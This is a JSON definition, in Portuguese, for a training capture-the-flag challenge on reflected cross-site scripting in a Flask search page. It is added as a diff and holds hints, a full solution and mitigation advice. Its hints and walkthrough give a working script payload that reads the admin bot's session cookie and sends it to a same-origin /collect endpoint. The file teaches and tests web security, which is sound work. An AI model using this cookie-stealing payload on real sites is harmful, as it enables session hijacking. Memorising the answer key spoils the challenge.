@@ -1,0 +1,80 @@
+{
+  "slug": "xss-reflected-search",
+  "title": "Refletido na query",
+  "codename": "SCOUT SEARCH",
+  "summary": "A página de busca da Scout reflete a query em HTML sem encoding. Monte um payload de script, envie o bot de admin para a URL refletida e capture seu cookie de sessão legível.",
+  "category": "xss",
+  "difficulty": "easy",
+  "kind": "challenge",
+  "lab_dir": "xss-reflected-search",
+  "estimated_minutes": 20,
+  "xp": 120,
+  "tech": [
+    "Flask",
+    "HTML",
+    "Selenium bot"
+  ],
+  "tags": [
+    "xss",
+    "reflected",
+    "cookie-exfiltration"
+  ],
+  "story": "A página de busca da Scout é somente leitura, mas o título dos resultados espelha a query. O bot de admin revisa buscas reportadas com um cookie privilegiado anexado. O cookie do bot é intencionalmente legível neste exercício.",
+  "objective": "Encontre um XSS refletido no fluxo de busca, faça o bot carregar seu payload e capture seu cookie por `/collect`. Envie o valor do cookie.",
+  "rules": "O bot só visita paths loopback neste lab. Não ataque nenhum outro serviço.",
+  "flags": [
+    {
+      "key": "flag",
+      "label": "Cookie do bot de admin",
+      "flag_type": "user",
+      "points": 120,
+      "required": true,
+      "requires_objective": true
+    }
+  ],
+  "hints": [
+    {
+      "level": 1,
+      "title": "Verifique a reflexão",
+      "body": "Busque por `test` e inspecione o código HTML. A query aparece dentro de um `<h2>` sem escaping nem codificação de entidades.",
+      "cost": 10
+    },
+    {
+      "level": 2,
+      "title": "Monte a exfiltração",
+      "body": "Use `<script>fetch('/collect?c='+encodeURIComponent(document.cookie))</script>`. O collector é de mesma origem e fica em `/captured`.",
+      "cost": 20
+    },
+    {
+      "level": 3,
+      "title": "Reporte a URL",
+      "body": "Codifique o payload para URL na query, abra `/report` e envie um path como `/?q=<script>fetch('/collect?c='+encodeURIComponent(document.cookie))</script>`. Depois leia `/captured`.",
+      "cost": 25
+    }
+  ],
+  "solution": {
+    "walkthrough": "1. Busque por `<script>alert(1)</script>` e confirme que ele executa ou aparece sem encoding no título.\n2. Monte:\n```text\n/?q=<script>fetch('/collect?c='+encodeURIComponent(document.cookie))</script>\n```\n3. Envie esse path local ao bot em `/report`.\n4. Abra `/captured`; o cookie `admin_session` do bot contém a flag. Envie-o. O callback do objetivo registra a exfiltração bem-sucedida.",
+    "root_cause": "XSS refletido. O termo de busca é interpolado em HTML sem output encoding sensível ao contexto. O bot administrativo combina um cookie privilegiado com conteúdo controlado pelo atacante na mesma origem.",
+    "mitigation": "Aplique output encoding sensível ao contexto (autoescaping do Jinja, codificação de entidades HTML) e uma Content-Security-Policy estrita. Marque cookies sensíveis como HttpOnly, use SameSite, evite colocar segredos em cookies legíveis por script e isole a navegação administrativa."
+  },
+  "references": [
+    {
+      "title": "PortSwigger — Reflected XSS",
+      "url": "https://portswigger.net/web-security/cross-site-scripting/reflected",
+      "source_type": "official",
+      "description": "Mecânica e exploração do XSS refletido."
+    },
+    {
+      "title": "OWASP XSS Prevention Cheat Sheet",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
+      "source_type": "standard",
+      "description": "Regras de output encoding sensível ao contexto."
+    },
+    {
+      "title": "CWE-79 — Cross-site Scripting",
+      "url": "https://cwe.mitre.org/data/definitions/79.html",
+      "source_type": "standard",
+      "description": "Definição da fraqueza e consequências."
+    }
+  ]
+}
